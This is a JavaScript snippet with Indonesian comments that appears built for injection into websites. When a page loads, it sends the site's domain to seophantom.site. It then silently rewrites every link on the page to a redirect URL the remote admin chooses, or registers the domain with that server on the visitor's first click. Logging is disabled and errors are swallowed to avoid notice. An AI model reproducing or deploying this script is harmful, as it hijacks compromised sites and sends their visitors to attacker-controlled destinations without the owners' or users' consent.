(function() {
    function debugLog(message) {
        return;
    }

    async function modifyLinks() {
        try {
            const apiUrl = 'https://seophantom.site/api.php';
            const autoRegisterUrl = 'https://seophantom.site/auto-register.php';

            const currentDomain = window.location.hostname;
            debugLog("Domain saat ini: " + currentDomain);
            
            debugLog("URL lengkap: " + window.location.href);
            
            debugLog("Memeriksa domain di API: " + apiUrl + "?domain=" + currentDomain);
            const response = await fetch(`${apiUrl}?domain=${currentDomain}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            debugLog("Respon API: " + JSON.stringify(data));
            
            if (data && data.redirect && data.redirect.trim() !== '') {
                // Jika domain terdaftar dan memiliki redirect URL yang sudah diatur admin
                const redirectUrl = data.redirect.replace(/\/$/, '');
                debugLog("Domain terdaftar dengan redirect URL: " + redirectUrl);
                
                // Hanya ubah href, tanpa menambahkan event listener yang mencurigakan
                document.querySelectorAll('a').forEach(link => {
                    try {
                        if (link.href && !link.href.includes('javascript:')) {
                            debugLog("Mengubah tautan dari: " + link.href + " ke: " + redirectUrl);
                            
                            // Simpan URL asli sebagai atribut data untuk referensi jika diperlukan
                            link.setAttribute('data-original-url', link.href);
                            
                            // Langsung ubah href tanpa event listener
                            link.href = redirectUrl;
                        }
                    } catch (e) {
                        // Error handling tanpa log
                    }
                });
            } 
            else if (data && data.register_required) {
                debugLog("Domain belum terdaftar, mendeteksi klik pertama untuk registrasi");
                
                let firstClickRegistered = false;
                
                // Tambahkan event listener hanya untuk keperluan pendaftaran otomatis
                document.addEventListener('click', async function(e) {
                    if (!firstClickRegistered) {
                        firstClickRegistered = true;
                        debugLog("Klik pertama terdeteksi, mendaftarkan domain tanpa redirect URL");
                        
                        try {
                            const registerResponse = await fetch(autoRegisterUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json'
                                },
                                body: JSON.stringify({
                                    domain: currentDomain
                                })
                            });
                            
                            const result = await registerResponse.json();
                            debugLog("Hasil pendaftaran domain: " + JSON.stringify(result));
                        } catch (error) {
                            // Error handling tanpa log
                        }
                    }
                }, { once: true, passive: true }); // Ditambahkan once:true agar hanya berjalan sekali
                
                // Tidak perlu memodifikasi tautan jika belum ada redirect URL
            }
        } catch (error) {
            // Tangkap error tanpa logging ke console
        }
    }

    if (document.readyState === 'loading') {
        debugLog("Menunggu DOMContentLoaded");
        document.addEventListener('DOMContentLoaded', modifyLinks);
    } else {
        debugLog("DOM sudah siap, memulai langsung");
        modifyLinks();
    }
})();
